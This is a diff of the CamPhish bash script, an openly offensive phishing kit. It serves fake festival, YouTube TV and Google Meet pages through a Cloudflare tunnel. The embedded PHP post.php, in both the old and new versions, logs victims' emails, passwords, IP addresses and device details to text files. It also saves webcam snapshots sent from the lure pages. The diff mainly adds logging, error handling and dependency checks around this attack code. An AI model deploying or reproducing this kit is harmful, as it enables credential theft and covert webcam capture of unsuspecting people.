@@ -1,31 +1,125 @@
+
+
 #!/bin/bash
 
+# Script version
+VERSION="1.1.0"
+
+# Configuration
+LOG_FILE="camphish.log"
+TEMP_DIR="/tmp/camphish_$(date +%s)"
+
+# Colors for output
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+NC='\033[0m' # No Color
+
+# Logging function
+log() {
+    local level=$1
+    local message=$2
+    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
+    
+    case $level in
+        "INFO") echo -e "[${timestamp}] ${BLUE}INFO:${NC} $message" | tee -a "$LOG_FILE" ;;
+        "SUCCESS") echo -e "[${timestamp}] ${GREEN}SUCCESS:${NC} $message" | tee -a "$LOG_FILE" ;;
+        "WARNING") echo -e "[${timestamp}] ${YELLOW}WARNING:${NC} $message" | tee -a "$LOG_FILE" ;;
+        "ERROR") echo -e "[${timestamp}] ${RED}ERROR:${NC} $message" | tee -a "$LOG_FILE" ;;
+        *) echo -e "[${timestamp}] $message" | tee -a "$LOG_FILE" ;;
+    esac
+}
+
+# Cleanup function
+cleanup() {
+    log "INFO" "Cleaning up temporary files..."
+    [ -d "$TEMP_DIR" ] && rm -rf "$TEMP_DIR"
+    log "INFO" "Cleanup complete."
+}
+
+# Error handling
+handle_error() {
+    local exit_code=$?
+    local line_number=$1
+    local command=$2
+    
+    log "ERROR" "Command failed with exit code $exit_code at line $line_number: $command"
+    cleanup
+    exit $exit_code
+}
+
 # Set error handling
-set -e
+trap 'handle_error $LINENO "$BASH_COMMAND"' ERR
 
 # Windows compatibility check
-if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
-  # We're on Windows
-  windows_mode=true
-  echo "Windows system detected. Some commands will be adapted for Windows compatibility."
-  
-  # Define Windows-specific command replacements
-  function killall() {
-    taskkill /F /IM "$1" 2>/dev/null
-  }
-  
-  function pkill() {
-    if [[ "$1" == "-f" ]]; then
-      shift
-      shift
-      taskkill /F /FI "IMAGENAME eq $1" 2>/dev/null
-    else
-      taskkill /F /IM "$1" 2>/dev/null
-    fi
-  }
+windows_mode=false
+if [[ "$(uname -a)" =~ (MINGW|MSYS|CYGWIN|Windows) ]]; then
+    windows_mode=true
+    log "INFO" "Windows system detected. Enabling Windows compatibility mode."
+    
+    # Windows-specific command replacements
+    function killall() {
+        taskkill /F /IM "$1" 2>/dev/null || true
+    }
+    
+    function pkill() {
+        if [[ "$1" == "-f" ]]; then
+            shift
+            local pattern=$1
+            taskkill /F /FI "IMAGENAME eq $pattern" 2>/dev/null || true
+        else
+            taskkill /F /IM "$1" 2>/dev/null || true
+        fi
+    }
+    
+    # Create a temporary directory for Windows
+    TEMP_DIR=$(mktemp -d "${TEMP:-%TEMP%}/camphish_XXXXXX")
 else
-  windows_mode=false
+    # Create a temporary directory for Unix-like systems
+    TEMP_DIR=$(mktemp -d)
 fi
+
+# Ensure temporary directory exists
+mkdir -p "$TEMP_DIR"
+
+# Dependency check
+check_dependencies() {
+    local missing_deps=()
+    
+    # Check for required commands
+    for cmd in php ssh-keygen; do
+        if ! command -v "$cmd" &> /dev/null; then
+            missing_deps+=("$cmd")
+        fi
+    done
+    
+    # Check for PHP version if PHP is installed
+    if command -v php &> /dev/null; then
+        php_version=$(php -r 'echo PHP_MAJOR_VERSION * 10000 + PHP_MINOR_VERSION * 100 + PHP_RELEASE_VERSION;')
+        if [ "$php_version" -lt 70300 ]; then
+            log "WARNING" "PHP 7.3 or higher is recommended. Current version: $(php -v | head -n 1)"
+        fi
+    fi
+    
+    # Handle missing dependencies
+    if [ ${#missing_deps[@]} -gt 0 ]; then
+        log "ERROR" "Missing required dependencies: ${missing_deps[*]}"
+        if [ "$windows_mode" = true ]; then
+            log "INFO" "Please install the required dependencies manually."
+        else
+            log "INFO" "You can install them using your package manager."
+            if command -v apt-get &> /dev/null; then
+                log "INFO" "Try: sudo apt-get update && sudo apt-get install ${missing_deps[*]}"
+            elif command -v yum &> /dev/null; then
+                log "INFO" "Try: sudo yum install ${missing_deps[*]}"
+            fi
+        fi
+        exit 1
+    fi
+    
+    log "SUCCESS" "All dependencies are installed."
+}
 
 trap 'printf "\n";stop' 2
 
@@ -40,7 +134,7 @@ printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | 
 printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
 printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
 printf " \e[1;93m CamPhish Ver 1 \e[0m \n"
-printf " \e[1;77m YT | YATHARTH \e[0m \n"
+printf " \e[1;77m YT | YT \e[0m \n"
 
 printf "\n"
 
@@ -291,314 +385,140 @@ checkfound
 }
 
 payload_cloudflare() {
-    # Get the Cloudflare tunnel URL
-    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "$HOME/.cld.log" 2>/dev/null || true)
-    
-    if [ -z "$link" ]; then
-        printf "\e[1;91m[!] Failed to get Cloudflare tunnel URL. Please check your internet connection.\e[0m\n"
-        exit 1
-    fi
-    
-    printf "\e[1;92m[+] Using Cloudflare tunnel URL: %s\e[0m\n" "$link"
+link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "$HOME/.cld.log")
 
-# Create a secure PHP router
+# Create a simple PHP router
 cat > index.php << 'EOL'
 <?php
-// Disable error display in production
-error_reporting(0);
-ini_set('display_errors', 0);
+$request = $_SERVER['REQUEST_URI'];
 
-// Set security headers
-header('X-Frame-Options: DENY');
-header('X-Content-Type-Options: nosniff');
-header('X-XSS-Protection: 1; mode=block');
-header('Referrer-Policy: no-referrer');
-header('Content-Security-Policy: default-src \'self\'');
-
-// Get the request URI
-$request = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
-$request = ltrim($request, '/');
-
-// Route requests
-if ($request === 'post.php' || $request === '') {
-    // Handle form submissions
-    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-        require_once 'post.php';
-        exit;
-    }
-    // Serve the main page
-    if (file_exists('index2.html')) {
-        readfile('index2.html');
-    } else if (file_exists('index.html')) {
-        readfile('index.html');
-    } else {
-        header('HTTP/1.0 404 Not Found');
-        echo 'Page not found';
-    }
-} else if ($request === 'debug_log.php') {
-    // Handle debug logs
-    require_once 'debug_log.php';
-} else if (file_exists($request)) {
-    // Serve static files if they exist
-    $mime_types = [
-        'html' => 'text/html',
-        'css'  => 'text/css',
-        'js'   => 'application/javascript',
-        'png'  => 'image/png',
-        'jpg'  => 'image/jpeg',
-        'jpeg' => 'image/jpeg',
-        'gif'  => 'image/gif',
-    ];
-    
-    $ext = strtolower(pathinfo($request, PATHINFO_EXTENSION));
-    if (array_key_exists($ext, $mime_types)) {
-        header('Content-Type: ' . $mime_types[$ext]);
-    }
-    readfile($request);
+// Serve the appropriate HTML file
+if (file_exists('index2.html')) {
+    readfile('index2.html');
+} else if (file_exists('index.html')) {
+    readfile('index.html');
 } else {
-    // 404 Not Found
-    header('HTTP/1.0 404 Not Found');
-    echo '404 Not Found';
+    // Default response
+    header('Content-Type: text/plain');
+    echo 'Page not found';
 }
 ?>
 EOL
 
 # Process the selected template
 if [[ $option_tem -eq 1 ]]; then
-    # Festival Wishes template
-    if [ ! -f "festivalwishes.html" ]; then
-        printf "\e[1;91m[!] Error: festivalwishes.html not found!\e[0m\n"
-        exit 1
-    fi
     sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
     sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
     rm -f index3.html
     
 elif [[ $option_tem -eq 2 ]]; then
-    # Live YouTube TV template
-    if [ ! -f "LiveYTTV.html" ]; then
-        printf "\e[1;91m[!] Error: LiveYTTV.html not found!\e[0m\n"
-        exit 1
-    fi
-    
-    # Create index2.html with proper permissions
-    if ! sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html; then
-        printf "\e[1;91m[!] Error: Failed to process LiveYTTV.html\e[0m\n"
-        exit 1
-    fi
-    
-    if ! sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html; then
-        printf "\e[1;91m[!] Error: Failed to process YouTube video ID\e[0m\n"
-        rm -f index3.html
-        exit 1
-    fi
-    
+    sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
+    sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
     rm -f index3.html
     
 elif [[ $option_tem -eq 4 ]]; then
-    # Google Meet template
-    if [ ! -f "GoogleMeet.html" ]; then
-        printf "\e[1;91m[!] Error: GoogleMeet.html not found!\e[0m\n"
-        exit 1
-    fi
+    # For Google Meet, we need to handle both the form and image capture
+    sed 's+forwarding_link+'$link'+g' GoogleMeet.html > index2.html
     
-    # Create index2.html with the Google Meet template and proper permissions
-    if ! sed 's+forwarding_link+'$link'+g' GoogleMeet.html > index3.html; then
-        printf "\e[1;91m[!] Error: Failed to process GoogleMeet.html\e[0m\n"
-        exit 1
-    fi
-    
-    if ! sed 's+abc-defg-hij+'${meet_code:-abc-defg-hij}'+g' index3.html > index2.html; then
-        printf "\e[1;91m[!] Error: Failed to process meeting code\e[0m\n"
-        rm -f index3.html
-        exit 1
-    fi
-    
-    rm -f index3.html
-    
-    # Create necessary directories with proper permissions
+    # Create a directory for captured images if it doesn't exist
     mkdir -p captured_images
-    chmod 755 captured_images
     
-    # Create logs directory if it doesn't exist
-    mkdir -p logs
-    chmod 755 logs
-    
-    # Create a secure PHP endpoint to handle form submissions
+    # Create a simple PHP endpoint to handle form submissions
     cat > post.php << 'PHP_END'
 <?php
-// Disable error display in production
-error_reporting(0);
-ini_set('display_errors', 0);
-
 // Set timezone
 date_default_timezone_set('Asia/Kolkata');
 
-// Set security headers
-header('X-Frame-Options: DENY');
-header('X-Content-Type-Options: nosniff');
-header('X-XSS-Protection: 1; mode=block');
-header('Referrer-Policy: no-referrer');
-header('Content-Type: application/json');
-
-/**
- * Get client IP address securely
- */
+// Get client IP
 function get_client_ip() {
-    $ip_keys = [
-        'HTTP_CLIENT_IP',
-        'HTTP_X_FORWARDED_FOR',
-        'HTTP_X_FORWARDED',
-        'HTTP_FORWARDED_FOR',
-        'HTTP_FORWARDED',
-        'REMOTE_ADDR'
-    ];
-    
-    foreach ($ip_keys as $key) {
-        if (array_key_exists($key, $_SERVER) === true) {
-            foreach (explode(',', $_SERVER[$key]) as $ip) {
-                $ip = trim($ip);
-                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
-                    return $ip;
-                }
-            }
-        }
-    }
-    
-    return 'UNKNOWN';
+    $ipaddress = '';
+    if (isset($_SERVER['HTTP_CLIENT_IP']))
+        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
+    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
+        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    else if(isset($_SERVER['HTTP_X_FORWARDED']))
+        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
+    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
+        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
+    else if(isset($_SERVER['HTTP_FORWARDED']))
+        $ipaddress = $_SERVER['HTTP_FORWARDED'];
+    else if(isset($_SERVER['REMOTE_ADDR']))
+        $ipaddress = $_SERVER['REMOTE_ADDR'];
+    else
+        $ipaddress = 'UNKNOWN';
+    return $ipaddress;
 }
 
-/**
- * Get browser information
- */
-function get_browser_info($user_agent) {
-    if (preg_match('~MSIE|Internet Explorer~i', $user_agent) || 
-        (strpos($user_agent, 'Trident/7.0; rv:11.0') !== false)) {
-        return 'Internet Explorer';
-    } elseif (strpos($user_agent, 'Firefox') !== false) {
-        return 'Mozilla Firefox';
-    } elseif (strpos($user_agent, 'Chrome') !== false) {
-        return 'Google Chrome';
-    } elseif (strpos($user_agent, 'Safari') !== false) {
-        return 'Safari';
-    } elseif (strpos($user_agent, 'Opera') !== false || strpos($user_agent, 'OPR/') !== false) {
-        return 'Opera';
-    } elseif (strpos($user_agent, 'Edge') !== false) {
-        return 'Microsoft Edge';
-    }
-    return 'Unknown';
+// Get user agent info
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+$browser = 'Unknown';
+$os = 'Unknown';
+
+// Get browser
+if (strpos($user_agent, 'MSIE') !== false || strpos($user_agent, 'Trident') !== false) {
+    $browser = 'Internet Explorer';
+} elseif (strpos($user_agent, 'Firefox') !== false) {
+    $browser = 'Mozilla Firefox';
+} elseif (strpos($user_agent, 'Chrome') !== false) {
+    $browser = 'Google Chrome';
+} elseif (strpos($user_agent, 'Opera Mini') !== false) {
+    $browser = 'Opera Mini';
+} elseif (strpos($user_agent, 'Opera') !== false) {
+    $browser = 'Opera';
+} elseif (strpos($user_agent, 'Safari') !== false) {
+    $browser = 'Safari';
 }
 
-/**
- * Get operating system information
- */
-function get_os_info($user_agent) {
-    if (preg_match('/windows|win32|win64/i', $user_agent)) {
-        return 'Windows';
-    } elseif (preg_match('/android/i', $user_agent)) {
-        return 'Android';
-    } elseif (preg_match('/linux/i', $user_agent)) {
-        return 'Linux';
-    } elseif (preg_match('/macintosh|mac os x|mac_powerpc/i', $user_agent)) {
-        return 'Mac OS';
-    } elseif (preg_match('/iphone|ipad|ipod/i', $user_agent)) {
-        return 'iOS';
-    }
-    return 'Unknown';
+// Get OS
+if (strpos($user_agent, 'Windows') !== false) {
+    $os = 'Windows';
+} elseif (strpos($user_agent, 'Linux') !== false) {
+    $os = 'Linux';
+} elseif (strpos($user_agent, 'Mac') !== false) {
+    $os = 'Mac';
+} elseif (strpos($user_agent, 'Android') !== false) {
+    $os = 'Android';
+} elseif (strpos($user_agent, 'iOS') !== false) {
+    $os = 'iOS';
 }
 
-// Initialize response array
-$response = [
-    'status' => 'error',
-    'message' => 'Invalid request'
-];
-
-try {
-    // Get client info
-    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
-    $browser = get_browser_info($user_agent);
-    $os = get_os_info($user_agent);
+// Handle Google Meet form submission
+if (isset($_POST['email'])) {
+    $email = $_POST['email'];
+    $password = isset($_POST['password']) ? $_POST['password'] : 'N/A';
     $ip = get_client_ip();
     $date = date('Y-m-d H:i:s');
-
-    // Handle Google Meet form submission
-    if (isset($_POST['email'])) {
-        $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
-        $password = isset($_POST['password']) ? $_POST['password'] : 'N/A';
-        
-        // Log the credentials
-        $log = sprintf(
-            "[%s] [GOOGLE_MEET] IP: %s | Email: %s | Password: %s | Browser: %s | OS: %s | User-Agent: %s\n",
-            $date,
-            $ip,
-            $email,
-            $password,
-            $browser,
-            $os,
-            $user_agent
-        );
-        
-        // Save to logs directory
-        file_put_contents('logs/credentials.txt', $log, FILE_APPEND);
-        
-        $response = [
-            'status' => 'success',
-            'redirect' => 'https://meet.google.com/error'
-        ];
-    }
-    // Handle image capture
-    elseif (isset($_POST['cat'])) {
-        $imageData = $_POST['cat'];
-        
-        if (!empty($imageData)) {
-            // Extract base64 data
-            if (strpos($imageData, 'base64,') !== false) {
-                $imageData = explode('base64,', $imageData)[1];
-            }
-            
-            $imageData = base64_decode($imageData);
-            
-            if ($imageData !== false) {
-                // Generate filename with timestamp and random string
-                $filename = 'captured_images/cam_' . date('Ymd_His') . '_' . bin2hex(random_bytes(4)) . '.png';
-                
-                // Save the image
-                if (file_put_contents($filename, $imageData) !== false) {
-                    // Log the capture
-                    $log = sprintf(
-                        "[%s] [IMAGE_CAPTURE] IP: %s | File: %s | Browser: %s | OS: %s\n",
-                        $date,
-                        $ip,
-                        $filename,
-                        $browser,
-                        $os
-                    );
-                    
-                    file_put_contents('logs/capture_log.txt', $log, FILE_APPEND);
-                    
-                    $response = [
-                        'status' => 'success',
-                        'message' => 'Image captured successfully'
-                    ];
-                } else {
-                    $response['message'] = 'Failed to save image';
-                }
-            } else {
-                $response['message'] = 'Invalid image data';
-            }
-        } else {
-            $response['message'] = 'No image data received';
-        }
-    }
-} catch (Exception $e) {
-    // Log any errors
-    error_log('Error in post.php: ' . $e->getMessage());
-    $response['message'] = 'An error occurred';
+    
+    $log = "[GOOGLE_MEET] Date: $date | IP: $ip | Email: $email | Password: $password | Browser: $browser | OS: $os\n";
+    file_put_contents('saved_google_meet_credentials.txt', $log, FILE_APPEND);
 }
 
-// Return JSON response
+// Handle image capture
+if (isset($_POST['cat'])) {
+    $date = date('dMYHis');
+    $imageData = $_POST['cat'];
+    
+    if (!empty($imageData)) {
+        $filteredData = substr($imageData, strpos($imageData, ",")+1);
+        $unencodedData = base64_decode($filteredData);
+        
+        // Create captured_images directory if it doesn't exist
+        if (!file_exists('captured_images')) {
+            mkdir('captured_images', 0777, true);
+        }
+        
+        $filename = 'captured_images/cam_'.$date.'.png';
+        file_put_contents($filename, $unencodedData);
+        
+        // Log the image capture
+        $log = "[IMAGE_CAPTURE] Date: $date | IP: $ip | File: $filename | Browser: $browser | OS: $os\n";
+        file_put_contents('capture_log.txt', $log, FILE_APPEND);
+    }
+}
+
+// Always return success response
 header('Content-Type: application/json');
-echo json_encode($response);
+echo json_encode(['status' => 'success']);
 ?>
 PHP_END
 
@@ -801,47 +721,37 @@ fi
 }
 
 select_template() {
-    if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
-        printf "\e[1;93m[!] Invalid tunnel option! try again\e[0m\n"
-        sleep 1
-        clear
-        banner
-        camphish
-        return 1
-    fi
-    
-    printf "\n-----Choose a template----\n"
-    printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
-    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
-    printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
-    printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Google Meet\e[0m\n"
-    
-    default_option_template="1"
-    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template [1-4, default:1]: \e[0m' option_tem
-    option_tem="${option_tem:-${default_option_template}}"
-    
-    case $option_tem in
-        1)
-            read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
-            fest_name="${fest_name//[^a-zA-Z0-9]/}"  # Only allow alphanumeric characters
-            ;;
-        2)
-            read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
-            yt_video_ID="${yt_video_ID//[^a-zA-Z0-9_-]/}"  # Clean YouTube ID
-            ;;
-        3)
-            # Online Meeting - no additional input needed
-            ;;
-        4)
-            read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter meeting code (e.g., abc-defg-hij): \e[0m' meet_code
-            meet_code="${meet_code//[^a-zA-Z0-9-]/}"  # Only allow alphanumeric and hyphens
-            ;;
-        *)
-            printf "\e[1;93m[!] Invalid template option! Please try again\e[0m\n"
-            sleep 1
-            select_template
-            ;;
-    esac
+if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
+printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
+sleep 1
+clear
+banner
+camphish
+else
+printf "\n-----Choose a template----\n"    
+printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Google Meet\e[0m\n"
+default_option_template="1"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
+option_tem="${option_tem:-${default_option_template}}"
+if [[ $option_tem -eq 1 ]]; then
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
+fest_name="${fest_name//[[:space:]]/}"
+elif [[ $option_tem -eq 2 ]]; then
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
+elif [[ $option_tem -eq 3 ]]; then
+    printf ""
+elif [[ $option_tem -eq 4 ]]; then
+    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter meeting code (e.g., abc-defg-hij): \e[0m' meet_code
+    meet_code="${meet_code//[^a-zA-Z0-9-]/}"  # Clean input
+else
+printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
+sleep 1
+select_template
+fi
+fi
 }
 
 banner
